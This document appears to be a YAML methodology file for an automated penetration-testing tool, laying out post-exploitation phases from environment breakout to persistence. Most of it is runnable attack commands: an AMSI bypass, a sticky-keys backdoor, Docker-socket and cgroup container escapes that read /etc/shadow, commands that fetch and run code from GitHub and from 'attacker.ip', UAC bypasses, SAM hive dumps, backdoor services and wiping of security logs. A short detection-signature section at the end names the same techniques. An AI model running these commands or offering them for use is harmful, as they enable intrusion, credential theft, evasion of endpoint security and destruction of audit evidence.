id: breakout_methodology
name: "Breakout and Post-Exploitation"
category: post_exploitation
description: "Comprehensive methodology for breaking out of restricted environments and escalating privileges"
estimated_duration: "2-4h"
risk_level: high
stealth_level: moderate

# Asset property-based triggers
asset_triggers:
  - id: restricted_environment_detected
    asset_type: host
    conditions:
      - property: "os_type"
        operator: "in"
        values: ["windows", "linux"]
      - or:
        - property: "shell_access"
          operator: "equals"
          value: true
        - property: "remote_access"
          operator: "equals"
          value: true
    trigger_name: "Restricted Environment Breakout"
    description: "Trigger when host access is available in potentially restricted environment"
    priority: 8

  - id: container_environment_detected
    asset_type: host
    conditions:
      - property: "virtualization"
        operator: "in"
        values: ["docker", "kubernetes", "container"]
    trigger_name: "Container Breakout"
    description: "Trigger when containerized environment is detected"
    priority: 9

  - id: vdi_environment_detected
    asset_type: host
    conditions:
      - or:
        - property: "software_installed"
          operator: "contains"
          value: "citrix"
        - property: "software_installed"
          operator: "contains"
          value: "vmware horizon"
        - property: "software_installed"
          operator: "contains"
          value: "terminal services"
    trigger_name: "VDI Breakout"
    description: "Trigger when VDI environment is detected"
    priority: 7

# Methodology phases
phases:
  # Phase 1: Initial Situational Awareness
  - id: situational_awareness
    name: "Initial Situational Awareness"
    description: "Understand the current environment before attempting breakout"
    order: 1
    steps:
      - id: basic_enumeration
        name: "Basic System Enumeration"
        type: command_group
        description: "Gather basic system information"
        order: 1
        commands:
          - platform: windows
            command: |
              whoami /all
              hostname
              systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
              ipconfig /all
              netstat -ano
              tasklist /v
              wmic process list brief
              query user
              net user
              net localgroup administrators
            timeout: "2m"
            expected_outputs:
              - type: text
                parser: generic
                success_indicators: ["Windows", "Administrator", "users"]
          - platform: linux
            command: |
              id
              hostname
              uname -a
              cat /etc/os-release
              ip a
              ss -tulpn
              ps aux
              who
              cat /etc/passwd
              groups
              sudo -l
            timeout: "2m"
            expected_outputs:
              - type: text
                parser: generic
                success_indicators: ["uid", "gid", "groups"]

      - id: virtualization_check
        name: "Check for Virtualization/Containerization"
        type: command_group
        description: "Identify if running in virtual/container environment"
        order: 2
        commands:
          - platform: windows
            command: |
              wmic computersystem get model
              wmic bios get serialnumber
              reg query "HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum"
            expected_outputs:
              - type: text
                parser: generic
                success_indicators: ["VMware", "VirtualBox", "Hyper-V"]
          - platform: linux
            command: |
              systemd-detect-virt
              cat /proc/1/cgroup
              ls -la /.dockerenv
              cat /proc/self/status | grep -i "seccomp\|apparmor"
              dmesg | grep -i hypervisor
            expected_outputs:
              - type: text
                parser: generic
                success_indicators: ["docker", "kvm", "vmware"]

        asset_discovery:
          search_patterns:
            - pattern: "VMware"
              asset_type: host
              confidence: 0.9
              metadata:
                virtualization: "vmware"
                breakout_potential: "medium"
            - pattern: "docker"
              asset_type: host
              confidence: 1.0
              metadata:
                virtualization: "docker"
                breakout_potential: "high"
            - pattern: "VirtualBox"
              asset_type: host
              confidence: 0.9
              metadata:
                virtualization: "virtualbox"
                breakout_potential: "low"

  # Phase 2: AV/EDR Detection and Evasion
  - id: security_evasion
    name: "AV/EDR Detection and Evasion"
    description: "Identify and evade endpoint security products"
    order: 2
    steps:
      - id: av_edr_detection
        name: "Identify Security Products"
        type: command_group
        description: "Enumerate installed security products"
        order: 1
        commands:
          - platform: windows
            command: |
              wmic /namespace:\\root\securitycenter2 path antivirusproduct
              wmic process where "name like '%defender%' or name like '%sophos%' or name like '%mcafee%' or name like '%symantec%' or name like '%crowdstrike%'" get name,processid,commandline
              sc query | findstr /i "defender sophos mcafee symantec crowdstrike"
              Get-Service | Where-Object {$_.DisplayName -like "*defender*" -or $_.DisplayName -like "*sophos*"}
            timeout: "1m"
            expected_outputs:
              - type: text
                parser: security_products
                success_indicators: ["Defender", "Sophos", "McAfee", "CrowdStrike"]
          - platform: linux
            command: |
              ps aux | grep -E "falcon|cylance|crowdstrike|sophos|mcafee"
              systemctl list-units --type=service | grep -E "falcon|cylance|crowdstrike"
              ls -la /opt/ | grep -E "falcon|cylance|crowdstrike|sophos"
            timeout: "1m"

      - id: amsi_bypass
        name: "AMSI Bypass (Windows)"
        type: command
        description: "Bypass Windows AMSI protection"
        order: 2
        platform: windows
        command: |
          powershell -ep bypass -c "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
        timeout: "30s"
        prerequisites:
          - powershell_available: true

        asset_discovery:
          search_patterns:
            - pattern: "Windows Defender"
              asset_type: security_product
              confidence: 1.0
              metadata:
                product_type: "antivirus"
                bypass_available: true
            - pattern: "CrowdStrike"
              asset_type: security_product
              confidence: 1.0
              metadata:
                product_type: "edr"
                bypass_difficulty: "high"

  # Phase 3: VDI Breakout Techniques
  - id: vdi_breakout
    name: "VDI Breakout Techniques"
    description: "Escape from Virtual Desktop Infrastructure environments"
    order: 3
    conditions:
      - vdi_detected: true
    steps:
      - id: identify_vdi_type
        name: "Identify VDI Environment"
        type: command_group
        description: "Determine specific VDI platform"
        order: 1
        commands:
          - platform: windows
            command: |
              Get-Process | Where-Object {$_.ProcessName -match "citrix"}
              Get-Service | Where-Object {$_.DisplayName -match "citrix"}
              reg query "HKLM\SOFTWARE\Citrix"
              Test-Path "C:\Program Files\Citrix"
              Get-Process | Where-Object {$_.ProcessName -match "vmware"}
              reg query "HKLM\SOFTWARE\VMware, Inc."
            timeout: "1m"

      - id: dialog_box_exploitation
        name: "Dialog Box Exploitation"
        type: manual
        description: "Exploit file dialogs to access system"
        order: 2
        instructions: |
          1. Open any application with file dialogs (Save As, Open, Print)
          2. In address bar type: C:\Windows\System32\cmd.exe
          3. Or navigate to system directories through browsing
          4. Right-click in dialog and select "Open in new window"
        risk_level: low
        detection_risk: low

      - id: sticky_keys_backdoor
        name: "Sticky Keys Backdoor"
        type: command
        description: "Replace sticky keys with command prompt"
        order: 3
        platform: windows
        command: |
          copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
        prerequisites:
          - write_access_system32: true
        notes: "Press Shift 5 times at login screen to activate"

      - id: registry_restriction_bypass
        name: "Registry Restriction Bypass"
        type: command_group
        description: "Remove common VDI restrictions"
        order: 4
        platform: windows
        commands:
          - name: "Enable Run Dialog"
            command: 'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRun /t REG_DWORD /d 0 /f'
          - name: "Enable Task Manager"
            command: 'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 0 /f'
          - name: "Enable Registry Editor"
            command: 'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 0 /f'
          - name: "Enable Command Prompt"
            command: 'reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 0 /f'

  # Phase 4: Container Breakout Techniques
  - id: container_breakout
    name: "Container Breakout Techniques"
    description: "Escape from Docker, Kubernetes, or other containerized environments"
    order: 4
    conditions:
      - containerized: true
    steps:
      - id: container_identification
        name: "Container Environment Identification"
        type: command_group
        description: "Confirm containerization and identify type"
        order: 1
        commands:
          - platform: linux
            command: |
              cat /proc/1/cgroup
              ls -la /.dockerenv
              cat /proc/self/cgroup | grep -i docker
              mount | grep docker
              ls -la /var/run/secrets/kubernetes.io
              env | grep KUBERNETES
            timeout: "1m"

      - id: privileged_container_check
        name: "Check for Privileged Container"
        type: command
        description: "Determine if running in privileged mode"
        order: 2
        platform: linux
        command: |
          capsh --print
          cat /proc/self/status | grep Cap
        timeout: "30s"

      - id: docker_socket_exploitation
        name: "Docker Socket Exploitation"
        type: command
        description: "Exploit mounted Docker socket"
        order: 3
        platform: linux
        command: |
          ls -la /var/run/docker.sock
          if [ -e /var/run/docker.sock ]; then
            docker -H unix:///var/run/docker.sock ps
            docker -H unix:///var/run/docker.sock run -it -v /:/host --privileged ubuntu chroot /host bash
          fi
        timeout: "2m"
        prerequisites:
          - docker_socket_mounted: true

      - id: capability_abuse
        name: "Linux Capability Abuse"
        type: command_group
        description: "Exploit dangerous Linux capabilities"
        order: 4
        platform: linux
        commands:
          - name: "CAP_SYS_ADMIN Mount Escape"
            command: |
              mount -t cgroup -o memory cgroup /tmp/cgroup
              echo 1 > /tmp/cgroup/notify_on_release
              echo "$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)/cmd" > /tmp/cgroup/release_agent
              echo '#!/bin/sh' > /cmd
              echo "cat /etc/shadow > /output" >> /cmd
              chmod +x /cmd
              sh -c "echo \$\$ > /tmp/cgroup/cgroup.procs"
            condition: "cap_sys_admin"
          - name: "CAP_DAC_OVERRIDE"
            command: "cat /etc/shadow"
            condition: "cap_dac_override"

  # Phase 5: Windows Privilege Escalation
  - id: windows_privesc
    name: "Windows Privilege Escalation"
    description: "Escalate privileges on Windows systems"
    order: 5
    platform: windows
    steps:
      - id: automated_enumeration
        name: "Automated Privilege Escalation Enumeration"
        type: command
        description: "Run automated privilege escalation checks"
        order: 1
        command: |
          powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks"
        timeout: "5m"
        alternatives:
          - description: "Use winPEAS if PowerUp unavailable"
            command: "certutil.exe -urlcache -f http://attacker.ip/winPEAS.exe winPEAS.exe && .\\winPEAS.exe"

      - id: service_enumeration
        name: "Service Enumeration"
        type: command_group
        description: "Check for vulnerable services"
        order: 2
        commands:
          - name: "Unquoted Service Paths"
            command: 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\\\" | findstr /i /v """"'
          - name: "Service Permissions"
            command: 'sc qc <SERVICE_NAME>'
          - name: "AlwaysInstallElevated Check"
            command: |
              reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
              reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

      - id: token_impersonation
        name: "Token Impersonation"
        type: command
        description: "Exploit SeImpersonatePrivilege"
        order: 3
        command: |
          whoami /priv | findstr "SeImpersonatePrivilege\|SeAssignPrimaryTokenPrivilege"
        alternatives:
          - description: "Use JuicyPotato"
            command: ".\\JuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -t * -c {CLSID}"
          - description: "Use PrintSpoofer"
            command: ".\\PrintSpoofer.exe -i -c cmd.exe"
          - description: "Use RoguePotato"
            command: ".\\RoguePotato.exe -r attacker.ip -e C:\\temp\\shell.exe -l 9999"

      - id: uac_bypass
        name: "UAC Bypass Techniques"
        type: command_group
        description: "Bypass User Account Control"
        order: 4
        commands:
          - name: "Fodhelper UAC Bypass"
            command: |
              REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe /c start cmd.exe" /f
              REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f
              fodhelper.exe
          - name: "EventVwr UAC Bypass"
            command: |
              REG ADD HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe /c start cmd.exe" /f
              eventvwr.exe

        asset_discovery:
          search_patterns:
            - pattern: "SeImpersonatePrivilege.*Enabled"
              asset_type: privilege
              confidence: 1.0
              metadata:
                privilege_type: "token_impersonation"
                escalation_method: "juicy_potato"
            - pattern: "AlwaysInstallElevated.*0x1"
              asset_type: vulnerability
              confidence: 1.0
              metadata:
                vuln_type: "privilege_escalation"
                exploit_method: "msi_installer"

  # Phase 6: Linux Privilege Escalation
  - id: linux_privesc
    name: "Linux Privilege Escalation"
    description: "Escalate privileges on Linux systems"
    order: 6
    platform: linux
    steps:
      - id: automated_linux_enum
        name: "Automated Linux Enumeration"
        type: command
        description: "Run automated privilege escalation checks"
        order: 1
        command: |
          curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
        timeout: "5m"
        alternatives:
          - description: "Use LinEnum if LinPEAS unavailable"
            command: "./LinEnum.sh -t -k password"

      - id: suid_enumeration
        name: "SUID/SGID Binary Enumeration"
        type: command_group
        description: "Find and exploit SUID binaries"
        order: 2
        commands:
          - name: "Find SUID Binaries"
            command: "find / -perm -u=s -type f 2>/dev/null"
          - name: "Find SGID Binaries"
            command: "find / -perm -g=s -type f 2>/dev/null"
          - name: "Check Capabilities"
            command: "getcap -r / 2>/dev/null"

      - id: sudo_exploitation
        name: "Sudo Exploitation"
        type: command_group
        description: "Exploit sudo misconfigurations"
        order: 3
        commands:
          - name: "Check Sudo Privileges"
            command: "sudo -l"
          - name: "CVE-2019-14287 Exploit"
            command: "sudo -u#-1 /bin/bash"
            condition: "sudo_version_vulnerable"

      - id: kernel_exploits
        name: "Kernel Exploitation"
        type: command_group
        description: "Use kernel exploits for privilege escalation"
        order: 4
        commands:
          - name: "Check Kernel Version"
            command: "uname -r"
          - name: "DirtyPipe (CVE-2022-0847)"
            command: "./dirtypipe /etc/passwd 1"
            condition: "kernel_vulnerable_dirtypipe"
          - name: "PwnKit (CVE-2021-4034)"
            command: "./pwnkit"
            condition: "polkit_vulnerable"

        asset_discovery:
          search_patterns:
            - pattern: ".*s.*/bin.*"
              asset_type: suid_binary
              confidence: 0.8
              metadata:
                binary_type: "suid"
                escalation_potential: "high"
            - pattern: "\\(ALL : ALL\\) ALL"
              asset_type: sudo_permission
              confidence: 1.0
              metadata:
                permission_type: "sudo_all"
                escalation_method: "direct"

  # Phase 7: Network Pivoting
  - id: network_pivoting
    name: "Network Pivoting and Lateral Movement"
    description: "Pivot through compromised systems to reach isolated networks"
    order: 7
    steps:
      - id: network_discovery
        name: "Internal Network Discovery"
        type: command_group
        description: "Discover internal network topology"
        order: 1
        commands:
          - platform: windows
            command: |
              ipconfig /all
              arp -a
              route print
              netstat -an
              net view
              net view /domain
          - platform: linux
            command: |
              ip a
              ip route
              arp -a
              netstat -tulpn
              route -n

      - id: ssh_pivoting
        name: "SSH Pivoting Setup"
        type: command_group
        description: "Set up SSH tunnels for pivoting"
        order: 2
        platform: linux
        commands:
          - name: "Dynamic Port Forward (SOCKS)"
            command: "ssh -D 9050 user@pivot_host"
          - name: "Local Port Forward"
            command: "ssh -L local_port:target_host:target_port user@pivot_host"
          - name: "Remote Port Forward"
            command: "ssh -R remote_port:local_host:local_port user@pivot_host"

      - id: credential_harvesting
        name: "Credential Harvesting"
        type: command_group
        description: "Extract credentials for lateral movement"
        order: 3
        commands:
          - platform: windows
            command: |
              reg save HKLM\SAM sam.hive
              reg save HKLM\SECURITY security.hive
              reg save HKLM\SYSTEM system.hive
          - platform: linux
            command: |
              cat /etc/shadow
              find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null

  # Phase 8: Persistence
  - id: persistence
    name: "Persistence Techniques"
    description: "Maintain access across reboots and remediation"
    order: 8
    steps:
      - id: windows_persistence
        name: "Windows Persistence"
        type: command_group
        description: "Establish persistence on Windows"
        order: 1
        platform: windows
        commands:
          - name: "Registry Run Key"
            command: 'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /d "C:\temp\shell.exe" /f'
          - name: "Scheduled Task"
            command: 'schtasks /create /tn "SystemUpdate" /tr "C:\temp\shell.exe" /sc onlogon /ru System'
          - name: "Service Creation"
            command: 'sc create BackgroundService binpath= "C:\temp\shell.exe" start= auto'

      - id: linux_persistence
        name: "Linux Persistence"
        type: command_group
        description: "Establish persistence on Linux"
        order: 2
        platform: linux
        commands:
          - name: "Cron Job"
            command: '(crontab -l ; echo "@reboot /tmp/shell.sh") | crontab -'
          - name: "Systemd Service"
            command: |
              cat > /etc/systemd/system/backdoor.service << EOF
              [Unit]
              Description=System Service
              [Service]
              Type=simple
              ExecStart=/tmp/shell.sh
              Restart=always
              [Install]
              WantedBy=multi-user.target
              EOF
              systemctl enable backdoor.service
          - name: "SSH Key"
            command: 'echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys'

# Chain triggers based on successful breakout
chain_triggers:
  - conditions:
      - outcome: "breakout_successful"
        value: true
      - outcome: "privilege_escalated"
        value: true
    trigger: lateral_movement
    priority: 9
    description: "Begin lateral movement after successful breakout"

  - conditions:
      - outcome: "container_escape"
        value: true
    trigger: host_enumeration
    priority: 8
    description: "Enumerate host system after container escape"

  - conditions:
      - outcome: "domain_access"
        value: true
    trigger: active_directory_enumeration
    priority: 10
    description: "Enumerate Active Directory after domain access"

# Outcome schema
outcome_schema:
  breakout_successful:
    type: boolean
    description: "Whether breakout from restricted environment was successful"
    critical: true

  privilege_escalated:
    type: boolean
    description: "Whether privilege escalation was achieved"
    critical: true

  container_escape:
    type: boolean
    description: "Whether container escape was successful"

  persistence_established:
    type: boolean
    description: "Whether persistence mechanisms were installed"

  credentials_harvested:
    type: array
    items:
      type: object
      properties:
        username: string
        password: string
        hash: string
        domain: string
    description: "Credentials obtained during breakout"

  pivot_established:
    type: boolean
    description: "Whether network pivot was successfully established"

  security_products_bypassed:
    type: array
    items: string
    description: "Security products that were successfully bypassed"

  vulnerabilities_exploited:
    type: array
    items:
      type: object
      properties:
        cve: string
        type: string
        severity: string
    description: "Vulnerabilities exploited during breakout"

# Suppression options
suppression:
  available_scopes:
    - scope: "methodology"
      description: "Skip breakout methodology for this engagement"
      conditions: ["Limited scope", "Post-exploitation out of scope"]
    - scope: "phase"
      description: "Skip specific breakout phases"
      conditions: ["Container escape not applicable", "VDI not in scope"]
    - scope: "host"
      description: "Skip breakout on specific hosts"
      conditions: ["Production system", "Critical infrastructure"]

# Deduplication
deduplication:
  strategy: "signature_based"
  signature_fields: ["host_id", "environment_type"]
  cooldown_period: "24h"
  max_executions: 3

# Risk and compliance notes
compliance_notes:
  - "Ensure breakout attempts are within authorized scope"
  - "Document all persistence mechanisms for cleanup"
  - "Avoid disrupting critical business operations"
  - "Follow data handling procedures for harvested credentials"

# Cleanup procedures
cleanup_procedures:
  - description: "Remove persistence mechanisms"
    commands:
      - platform: windows
        command: |
          reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /f
          schtasks /delete /tn "SystemUpdate" /f
          sc delete BackgroundService
      - platform: linux
        command: |
          crontab -r
          systemctl disable backdoor.service
          rm /etc/systemd/system/backdoor.service

  - description: "Clear evidence of breakout attempts"
    commands:
      - platform: windows
        command: |
          wevtutil cl Application
          wevtutil cl System
          wevtutil cl Security
      - platform: linux
        command: |
          > /var/log/auth.log
          > ~/.bash_history
          history -c

# Detection signatures (for blue team awareness)
detection_signatures:
  - name: "Sticky Keys Replacement"
    pattern: "sethc.exe replaced"
    log_source: "file_system"
    severity: "high"

  - name: "AMSI Bypass Attempt"
    pattern: "AmsiUtils.*amsiInitFailed"
    log_source: "powershell_logs"
    severity: "high"

  - name: "Container Escape Attempt"
    pattern: "mount.*cgroup.*notify_on_release"
    log_source: "system_logs"
    severity: "critical"

  - name: "Privilege Escalation Tool"
    pattern: "JuicyPotato|PrintSpoofer|RoguePotato"
    log_source: "process_creation"
    severity: "high"